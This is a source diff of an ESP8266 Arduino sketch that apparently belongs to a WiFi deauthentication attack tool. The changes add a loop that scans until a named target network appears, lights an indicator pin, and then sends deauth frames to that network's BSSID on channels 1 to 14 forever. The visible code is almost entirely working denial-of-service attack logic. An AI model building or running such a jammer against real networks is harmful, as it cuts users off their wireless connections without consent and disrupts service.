@@ -2,9 +2,11 @@
 
 
 
-int wifiChannelMax = 14;
-int detectedNetworkCount = 0;
-const char* targetSSID = "reacdoornet";
+const int wifiChannelMax = 14;
+const char* targetSSID = "ReACD-SchulungsnetzTHX1138";
+int delayBetweenChannelSwitch = 50; //delay between the deauth frame is sent on another channel in milliseconds
+const int targetNetworkFoundIndicatorPin = 5; //GPIO Pin 5(labeled as D1)
+
 
 //IEEE 802.11 WiFi management frame
 uint8_t packet[26] =
@@ -64,46 +66,57 @@ int scanForNetworks()
   return WiFi.scanNetworks();
 }
 
-void setup()
- {
-  // put your setup code here, to run once:
-  ESP.eraseConfig();
-  WiFi.mode(WIFI_STA);
-  WiFi.disconnect();
 
-  delay(1000);
-  detectedNetworkCount = scanForNetworks();
-  delay(1000);
 
-  uint8_t bssid[6];
+void findTargetNetwork()
+{
+  bool targetFound = false;
 
-  for(int i = 0;i<detectedNetworkCount;i++)
+  uint8_t targetBSSID[6];
+
+  while(!targetFound)
   {
-    if(WiFi.SSID(i) == targetSSID)
+    digitalWrite(targetNetworkFoundIndicatorPin, HIGH);
+    for(int i = 0;i<scanForNetworks();i++)
     {
-        memcpy(bssid,WiFi.BSSID(i),6);
+      if(WiFi.SSID(i) == targetSSID)
+      {
+        memcpy(targetBSSID,WiFi.BSSID(i),6);
+        targetFound = true;
         break;
+      }
     }
+    delay(1000);
+    digitalWrite(targetNetworkFoundIndicatorPin, LOW);
+    delay(1000);
   }
 
+  digitalWrite(targetNetworkFoundIndicatorPin, HIGH);
+  attackNetwork(targetBSSID);
+}
 
-
+void attackNetwork(uint8_t bssid[6])
+{
   for(;;)
   {
     for(int c = 1; c <= wifiChannelMax; c++)
     {
       deauthDevice(bssid, c);
-      delay(50);
+      delay(delayBetweenChannelSwitch);
     }
   }
-  
-
 }
 
 
+void setup()
+{
+  digitalWrite(targetNetworkFoundIndicatorPin, LOW);
+  ESP.eraseConfig();
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect();
 
-
-
+  findTargetNetwork();
+}
 
 
 void loop()
